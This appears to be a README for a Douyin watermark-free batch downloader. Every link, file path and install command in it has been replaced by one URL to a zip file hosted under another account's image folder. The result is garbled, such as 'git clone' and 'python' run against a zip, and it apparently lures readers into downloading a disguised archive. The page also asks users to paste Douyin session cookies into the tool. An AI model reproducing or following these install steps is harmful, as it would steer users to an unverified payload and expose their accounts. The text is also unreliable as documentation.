# 抖音下载器 - 无水印批量下载工具

![douyin-downloader](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip%E6%8A%96%E9%9F%B3%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%8E%BB%E6%B0%B4%E5%8D%B0%EF%BC%8C%E6%94%AF%E6%8C%81%E8%A7%86%E9%A2%91%E3%80%81%E5%9B%BE%E9%9B%86%E3%80%81%E5%90%88%E9%9B%86%E3%80%81%E9%9F%B3%E4%B9%90%28%E5%8E%9F%E5%A3%B0%29%E3%80%82%0A%E5%85%8D%E8%B4%B9%EF%BC%81%E5%85%8D%E8%B4%B9%EF%BC%81%E5%85%8D%E8%B4%B9%EF%BC%81&description=1&font=Jost&forks=1&logo=https%3A%2F%https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip%2Fjiji262%2Fdouyin-downloader%2Frefs%2Fheads%2Fmain%2Fimg%https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip+Board&pulls=1&stargazers=1&theme=Light)

一个功能强大的抖音内容批量下载工具，支持视频、图集、音乐、直播等多种内容类型的下载。提供两个版本：V1.0（稳定版）和 V2.0（增强版）。

## 📋 目录

- [快速开始](#-快速开始)
- [版本说明](#-版本说明)
- [V1.0 使用指南](#-v10-使用指南)
- [V2.0 使用指南](#-v20-使用指南)
- [Cookie 配置工具](#-cookie-配置工具)
- [支持的链接类型](#-支持的链接类型)
- [常见问题](#-常见问题)
- [更新日志](#-更新日志)

## ⚡ 快速开始

![qun](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)

### 环境要求

- **Python 3.9+**
- **操作系统**：Windows、macOS、Linux

### 安装步骤

1. **克隆项目**
```bash
git clone https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
cd douyin-downloader
```

2. **安装依赖**
```bash
pip install -r https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
```

3. **配置 Cookie**（首次使用需要）
```bash
# 方式1：自动获取（推荐）
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip

# 方式2：手动获取
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
```

## 📦 版本说明

### V1.0 (https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) - 稳定版
- ✅ **经过验证**：稳定可靠，经过大量测试
- ✅ **简单易用**：配置文件驱动，使用简单
- ✅ **功能完整**：支持所有内容类型下载
- ✅ **单个视频下载**：完全正常工作
- ⚠️ **需要手动配置**：需要手动获取和配置 Cookie

### V2.0 (https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) - 增强版
- 🚀 **自动 Cookie 管理**：支持自动获取和刷新 Cookie
- 🚀 **统一入口**：整合所有功能到单一脚本
- 🚀 **异步架构**：性能更优，支持并发下载
- 🚀 **智能重试**：自动重试和错误恢复
- 🚀 **增量下载**：支持增量更新，避免重复下载
- ⚠️ **单个视频下载**：目前 API 返回空响应（已知问题）
- ✅ **用户主页下载**：完全正常工作

## 🎯 V1.0 使用指南

### 配置文件设置

1. **编辑配置文件**
```bash
cp https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
# 编辑 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 文件
```

2. **配置示例**
```yaml
# 下载链接
link:
  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip                    # 单个视频
  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip              # 用户主页
  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip        # 合集

# 保存路径
path: ./Downloaded/

# Cookie配置（必填）
cookies:
  msToken: YOUR_MS_TOKEN_HERE
  ttwid: YOUR_TTWID_HERE
  odin_tt: YOUR_ODIN_TT_HERE
  passport_csrf_token: YOUR_PASSPORT_CSRF_TOKEN_HERE
  sid_guard: YOUR_SID_GUARD_HERE

# 下载选项
music: True    # 下载音乐
cover: True    # 下载封面
avatar: True   # 下载头像
json: True     # 保存JSON数据

# 下载模式
mode:
  - post       # 下载发布的作品
  # - like     # 下载喜欢的作品
  # - mix      # 下载合集

# 下载数量（0表示全部）
number:
  post: 0      # 发布作品数量
  like: 0      # 喜欢作品数量
  allmix: 0    # 合集数量
  mix: 0       # 单个合集内作品数量

# 其他设置
thread: 5      # 下载线程数
database: True # 使用数据库记录
```

### 运行程序

```bash
# 使用配置文件运行
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip

# 或者使用命令行参数
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --cmd False
```

### 使用示例

```bash
# 下载单个视频
# 在 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 中设置 link 为单个视频链接
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip

# 下载用户主页
# 在 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 中设置 link 为用户主页链接
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip

# 下载合集
# 在 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 中设置 link 为合集链接
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
```

## 🚀 V2.0 使用指南

### 命令行使用

```bash
# 下载单个视频（需要先配置 Cookie）
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip -u "https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip"

# 下载用户主页（推荐）
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip -u "https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip"

# 自动获取 Cookie 并下载
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --auto-cookie -u "https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip"

# 指定保存路径
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip -u "链接" --path "./my_videos/"

# 使用配置文件
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --config
```

### 配置文件使用

1. **创建配置文件**
```bash
cp https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
```

2. **配置示例**
```yaml
# 下载链接
link:
  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip

# 保存路径
path: ./Downloaded/

# 自动 Cookie 管理
auto_cookie: true

# 下载选项
music: true
cover: true
avatar: true
json: true

# 下载模式
mode:
  - post

# 下载数量
number:
  post: 10

# 增量下载
increase:
  post: false

# 数据库
database: true
```

3. **运行程序**
```bash
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --config
```

### 命令行参数

```bash
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip [选项] [链接...]

选项：
  -u, --url URL          下载链接
  -p, --path PATH        保存路径
  -c, --config           使用配置文件
  --auto-cookie          自动获取 Cookie
  --cookies COOKIES      手动指定 Cookie
  -h, --help            显示帮助信息
```

## 🍪 Cookie 配置工具

### 1. https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip - 自动获取工具

**功能**：使用 Playwright 自动打开浏览器，自动获取 Cookie

**使用方式**：
```bash
# 安装 Playwright
pip install playwright
playwright install chromium

# 运行自动获取
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
```

**特点**：
- ✅ 自动打开浏览器
- ✅ 支持扫码登录
- ✅ 自动检测登录状态
- ✅ 自动保存到配置文件
- ✅ 支持多种登录方式

**使用步骤**：
1. 运行 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
2. 选择提取方式（推荐选择1）
3. 在打开的浏览器中完成登录
4. 程序自动提取并保存 Cookie

### 2. https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip - 手动获取工具

**功能**：通过浏览器开发者工具手动获取 Cookie

**使用方式**：
```bash
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
```

**特点**：
- ✅ 无需安装 Playwright
- ✅ 详细的操作教程
- ✅ 支持 Cookie 验证
- ✅ 自动保存到配置文件
- ✅ 支持备份和恢复

**使用步骤**：
1. 运行 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
2. 选择"获取新的Cookie"
3. 按照教程在浏览器中获取 Cookie
4. 粘贴 Cookie 内容
5. 程序自动解析并保存

### Cookie 获取教程

#### 方法一：浏览器开发者工具

1. 打开浏览器，访问 [抖音网页版](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)
2. 登录你的抖音账号
3. 按 `F12` 打开开发者工具
4. 切换到 `Network` 标签页
5. 刷新页面，找到任意请求
6. 在请求头中找到 `Cookie` 字段
7. 复制以下关键 cookie 值：
   - `msToken`
   - `ttwid`
   - `odin_tt`
   - `passport_csrf_token`
   - `sid_guard`

#### 方法二：使用自动工具

```bash
# 推荐使用自动工具
python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
```

## 📋 支持的链接类型

### 🎬 视频内容
- **单个视频分享链接**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
- **单个视频直链**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
- **图集作品**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`

### 👤 用户内容
- **用户主页**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
  - 支持下载用户发布的所有作品
  - 支持下载用户喜欢的作品（需要权限）

### 📚 合集内容
- **用户合集**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
- **音乐合集**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`

### 🔴 直播内容
- **直播间**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`

## 🔧 常见问题

### Q: 为什么单个视频下载失败？
**A**: 
- V1.0：请检查 Cookie 是否有效，确保包含必要的字段
- V2.0：目前已知问题，API 返回空响应，建议使用用户主页下载

### Q: Cookie 过期怎么办？
**A**: 
- 使用 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip` 重新获取
- 或使用 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip` 手动获取

### Q: 下载速度慢怎么办？
**A**: 
- 调整 `thread` 参数增加并发数
- 检查网络连接
- 避免同时下载过多内容

### Q: 如何批量下载？
**A**: 
- V1.0：在 `https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip` 中添加多个链接
- V2.0：使用命令行传入多个链接或使用配置文件

### Q: 支持哪些格式？
**A**: 
- 视频：MP4 格式（无水印）
- 图片：JPG 格式
- 音频：MP3 格式
- 数据：JSON 格式

## 📝 更新日志

### V2.0 (2025-08)
- ✅ **统一入口**：整合所有功能到 `https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
- ✅ **自动 Cookie 管理**：支持自动获取和刷新
- ✅ **异步架构**：性能优化，支持并发下载
- ✅ **智能重试**：自动重试和错误恢复
- ✅ **增量下载**：支持增量更新
- ✅ **用户主页下载**：完全正常工作
- ⚠️ **单个视频下载**：API 返回空响应（已知问题）

### V1.0 (2024-12)
- ✅ **稳定可靠**：经过大量测试验证
- ✅ **功能完整**：支持所有内容类型
- ✅ **单个视频下载**：完全正常工作
- ✅ **配置文件驱动**：简单易用
- ✅ **数据库支持**：记录下载历史

## ⚖️ 法律声明

- 本项目仅供**学习交流**使用
- 请遵守相关法律法规和平台服务条款
- 不得用于商业用途或侵犯他人权益
- 下载内容请尊重原作者版权

## 🤝 贡献指南

欢迎提交 Issue 和 Pull Request！

### 报告问题
- 使用 [Issues](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) 报告 bug
- 请提供详细的错误信息和复现步骤

### 功能建议
- 在 Issues 中提出新功能建议
- 详细描述功能需求和使用场景

## 📄 许可证

本项目采用 [MIT License](LICENSE) 开源许可证。

---

<div align="center">

**如果这个项目对你有帮助，请给个 ⭐ Star 支持一下！**

[🐛 报告问题](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) • [💡 功能建议](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) • [📖 查看文档](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)

Made with ❤️ by [jiji262](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)

</div>
